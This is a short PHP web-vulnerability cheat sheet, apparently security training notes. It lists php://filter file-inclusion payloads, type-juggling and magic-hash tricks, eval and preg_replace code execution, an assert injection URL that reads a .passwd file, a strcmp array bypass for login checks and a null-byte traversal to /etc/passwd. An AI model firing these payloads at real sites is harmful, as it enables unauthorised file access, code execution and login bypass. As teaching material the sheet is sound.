---
title: PHP vulnerabilities
description: PHP vulnerabilities
---

# PHP

## PHP Wrappers

Official docs [here](https://www.php.net/manual/en/wrappers.php).

All wrappers :

```
file:// — Accessing local filesystem
http:// — Accessing HTTP(s) URLs
ftp:// — Accessing FTP(s) URLs
php:// — Accessing various I/O streams
zlib:// — Compression Streams
data:// — Data (RFC 2397)
glob:// — Find pathnames matching pattern
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — Process Interaction Streams
```

File inclusion :

```
php://filter/resource=index.php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php
php://filter/read=string.toupper|string.rot13/resource=index.php
```

## Type juggling

If you use `===`, PHP will do a strict comparison.

```php
"1" == 1        True
"1" === 1       False
"admin" == 0    True
"admin" === 0   False
```

You can find the comparison table [here](https://www.php.net/manual/en/types.comparisons.php).

## Magic Hashes

You cand find a list of magic hashes [here](https://github.com/spaze/hashes).

```php
md5('QLTHNDT') = 0e405967825401955372549139051580
0e405967825401955372549139051580 = 0 exponents 405967825401955372549139051580 = 0
php > var_dump(md5('QLTHNDT') == "0");
bool(true)
```

`0 power n` is equals to `0`.

## Interesting function

**eval** code execution :

```php
eval("phpinfo();");
```

**preg_replace** code execution (removed since PHP v7.0.0)

```php
preg_replace('/test/e', 'phpinfo()', 'test');

PREG_REPLACE_EVAL
```

More informations [here](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php)

**assert** without verification :

```php
assert("strpos('includes/$_GET['name'].inc.php', '..') === false")

victim.com/index.php?name=', 'A') === false and strlen(file_get_contents('.passwd')) === 10 and strpos('

Will result as : assert("strpos('includes/', 'A') === false and strlen(file_get_contents('.passwd')) === 10 and strpos('.inc.php', '..') === false")
```

**strcmp** array / null bypass :

```php
php > var_dump(strcmp(Array(), "admin") == 0);
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
bool(true)

Ex: strcmp($_GET['username'], 'admin') == 0
victim.com/index.php?name[]=
```

```php
php > var_dump(strcmp(null, "admin") == True);
bool(true)

php > var_dump(strcmp(null, "admin") === True);
bool(false)
```

## Tips

### Null byte

Null Byte : %00 (PHP Version < 5.3.4)

`http://victim.com/index.php?file=../etc/passwd%00`
